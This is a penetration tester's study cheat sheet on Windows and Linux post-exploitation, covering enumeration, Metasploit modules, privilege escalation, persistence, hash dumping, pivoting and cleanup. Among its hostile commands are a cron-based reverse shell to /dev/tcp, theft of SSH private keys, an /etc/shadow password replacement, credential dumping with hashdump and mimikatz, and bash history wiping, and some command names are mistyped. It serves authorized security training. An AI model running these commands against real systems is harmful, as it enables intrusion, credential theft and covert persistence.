# Post Exploitation

## Things we look for
### System related info
- hostname
- OS name (win7 8)
- OS build & service pack
- OS architecture
- installed update and hotfixes

### Users and Groups
- Current user and privs
- other users
- groups
- members of build in admin group
- additional user info

### Network Info
- Current IP & network adaptor
- Internal networks
- TCP/UDP services running and their respective ports
- Other hosts on the network
- routing table
- windows firewall state

### Processes & Services
- Running processes and services
- scheduled tasks

### Initial foothold from metasploit then use below command
- getuid
- sysinfo
- cat C:\\windows\system32\eula.txt
- getprivs
- use post msf module enum_logged_on_user
- ps
- show_mount

### Commends use for Non metasploit way
- systeminfo
- hostname
- wmic qfe get Caption,Description,HotFixID,InstalledOn
- whoami /priv
- query user
- net users
- net user <username> // find account with password expires set to never
- net localgroup
- arp -a // very important, display all the mac and ip of devices in this network
- print route
- netstat -ano
- netsh firewall show state // netsh advfirewall firewall
- netsh advfirewall show allprofiles
- netsh advfirewall firewall dump
- netsh advfirewall // to open help manual
- net start // services started in bg
- wmic service list brief
- tasklist /svc
- schtasks /query /fo LIST /v  //Really comes into play when priv esc
- powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt // Bypass execution policy and output it to txt file jaws-enum for notetaking

### Post exploit modules in metasploit (automation for some of the above commands)
- win_privs // same as just doing get privs in meterpreter
- enum_logged // check logged on users
- checkvm
- enum_application // check if programs installed on system have priv esc esploits
- enum_computers // enum all computers connected to the same network
- enum_patches // check hotfix and date
- snum_shares // check shares

JAWS enum scripts by 411hall [here](https://github.com/411Hall/JAWS) (powershell 2.0 with no dependancy so can use to in many places)

## Linux Enum
We look for the same stuff, just in different commands:
- Hostname
- Distro and releases version
- kernel version & architecture
- CPU info
- Disk info & mounted drives
- Installed packages/softwares

### Commands
- sessions -u <session ID> // to upgrade to meterpreter
- cat /etc/issue // identify distro
- cat /etc/*release // name and release version
- uname -a // kernel version
- env // environment for current user
- lscpu // cpu info
- free -h // how much ram is being consume
- df -h // file system and available storage, tip: sda is the equivalent of C drive
- lsblk | grep sd // also check disk setup
- dbkg -l // list installed packages and their version

### Users & Groups
- getuid // uid=0 means root
- groups <user account name> // check what group is the user in
- cat /etc/passwd | grep -v /nologin // don't show service AC, show all users
- `who` & `w` utility to show who is logged on the system
- last // show last user that logged on the system
- lastlog // display a list of users logged into the system

### Network info
- netstat
- ifconfig
- route
- ip a s
- `cat /etc/hosts` and `cat /etc/resolv.conf` for DNS related info
- cat /etc/networks
- arp -a // if this doesnt work, we can do arp command in meterpreter

### Processes, Services and Cronjobs
- ps aux // if ps isnt installed then use the ps in meterpreter
- ps aux | grep root
- top // check resource usage
- crontab -l
- ls -al /etc/cron* // display all cronjobs by their file
- cat /etc/cron* // show all the actual cronjobs and when are the being ran

## Automation in Linux
- enum_configs // gather linux config
- enum_network // network info
- enum_system // gather userinfo, system, packages
- checkvm // see if it's vm
- LinEnum by rebootuser [here](https://github.com/rebootuser/LinEnum)

## File transfer
- python2: `python -m SimpleHTTPServer 80`
- python3: `python3 -m http.server 80` 

Scenario: I want to transfer files in /usr/share/windows-binaries/ or from /usr/share/windows-resources/ . We will run the above command at the directory, and given we don't have meterpreter, we do the following

Windows:
- certutil -urlcache -f http://IP/filename.extension <output filename>

Linux:
- wget http://IP/filename.extension

## Upgrading shells (from non interactive to interactive)
This only affects linux, windows are irrelavant. The command is `/bin/bash -i` to get a semi interactive, but why? but before doing this it is important to make sure bash is there. So we do `cat /etc/shells` to 
see the available shells. Also, it's good to identify if python is there, if it is there by typing `python --version`. Then even bash is not installed, we can say `python -c  'import pty; pty.spawn("/bin/bash")'`
and this will spawn use a bash. Btw the previous command is for python2, check python3 for related command. if perl is installed `perl --help`, we can do `perl -e 'exec "/bin/bash";'`, ruby will be 
`ruby: exec "/bin/bash"`

1. it is more stable
2. env //check the $PATH to exec bin when a binary is called
3. To set it up we can say `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`
4. we could also set TERM by `export TERM=xterm`
5. and set default shell to bash by `export SHELL=bash`

## Windows Priv Esc
First thing first is to identify priv esc vulnerbilities. Here, we are not interested in local enum no more, we specifically wanna know the vectors we can use to privesc, thus we can use 
[this script](https://github.com/itm4n/PrivescCheck/tree/master) from itm4n for PrivescCheck

### After finding user credentials we can do the following
- psexec.py Administrator@IP // like ssh
- msf exploit module smb/psexec

## Linux Priv Esc

**Weak Permisions**
- `find / -not -type l -perm -o+w` //list out all files that can be modified by every users on the system, Exclude symbolic links (-type l means symbolic link; -not negates it)
- To replace /etc/shadow password, we can say `openssl passwd -1 -salt abc password123`

**SUDO priv**
- sudo -l //see gtfobin

### Persistence (Remember to clean up your shit)
- search persistence_service

## Windows Persistence




## Linux Persistence

### Persistence Via SSH Keys
- Beside password, we can use key to authenticate to protect it from bruteforcing
- Goal of this is to try find private ssh keys (usually in home folder hidden)
- cd .ssh/ (id_rsa folder stores the private key), which we can cat it out
- `scp username@IP:~/.ssh/id_rsa .` // use ssh to do a file transfer, after the `:` we specify the full $PATH of what we wanna download
- rmb to chmod 400
- To login we `ssh -i id_rsa user@IP`

### Cron Jobs
- cat /etc/cron*
- echo "***** /bin/bash -c 'bash -i >& /dev/tcp/IP/Port 0>&1'" > cron"

## Cracking Password Hashes
### Windows
- SAM db cannot be copied when the OS is running, however, sometimes the admin might make a SAM backup/copy which we might find
- Usually it lives in RAM, thats why we use in memory techniques
- SAM db is encrypted with a syskey, which we will need to have admin priv to access
- Tools we use: inbuilt meterpreter "hashdump" command, mimikatz
- After dumping we will crack with John and Hahscat

Proper Practice
- In meterpreter, we want to migrate to lsass since it manage all the passwords so we do a pgrep lsass and migrate PID
- `hashdump`

### Linux
- Linux shows the hashing algorithm used after the dollar sign
- post/linux/gather/hashdump
- john --format=sha512crypt <unshadowed txt> --wordlist=<wordlist>

## Pivoting with metasploit
Commands:
- run autoroute -s <victim machine 1 subnet eg:10.0.29.0/24> //specify the subnet
- run autoroute -p //display active routing table
- Within meterpreter, we say `portfwd add -l 1234 -p 80 -r <IP>`

## Cleaning Up
- During exploitation, we can engage the data on the systems, and we never want to manipulate or modify the system or data which we must refer the agreed rules of engagement.
- Some might allow the creation of account, but we must remember to clean up and delete the account
- Good practice is always store transfers at C:/Temp directory, on linux it is the /tmp dir
- MSF sometimes cannot delete the artifacts, but it will give us the location and we can delete it manually
- Also remember services and schedule tasks
- NEVER DELETE EVENT LOG
- KEEP NOTES ON EVERY STEP EVERY EXPLOITE, EVERY MSF MODULE YOU USED

Linux
- we can delete specific bash history file in the .bash_history file. We can go into this file and delete the lines, or `history -c` to clear all history, which isn't as nice
- `cat /dev/null > .bash_history` //essentially print nothing and forward to history file

## Additional resources

- https://blog.harmj0y.net/
- https://adsecurity.org/?page_id=1821
- https://metasploit.help.rapid7.com/docs/about-post-exploitation
- http://www.pentest-standard.org/index.php/Post_Exploitation
- https://offsec.red/mimikatz-cheat-sheet/
- https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

Tools/Malware Used 

- https://github.com/gentilkiwi/mimikatz
- https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1
- https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
